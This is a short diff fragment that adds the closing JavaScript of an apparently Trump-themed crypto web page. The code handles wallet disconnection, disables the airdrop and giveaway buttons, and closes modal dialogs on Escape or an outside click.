+                    btn.innerHTML = 'CONNECT WALLET';
+                    btn.classList.remove('trump-btn-blue');
+                    btn.classList.add('trump-btn-red');
+                }
+                $('airdropBtn').disabled = true;
+                $('giveawayBtn').disabled = true;
+                showNotification("Wallet disconnected");
+            });
+        }
+
+        // ESC / CLICK-OUTSIDE
+        document.addEventListener('keydown', e => {
+            if (e.key === 'Escape') closeAllModals();
+        });
+        document.addEventListener('click', e => {
+            if (e.target.classList.contains('trump-modal')) closeAllModals();
+        });
+    </script>
+</body>
+</html>
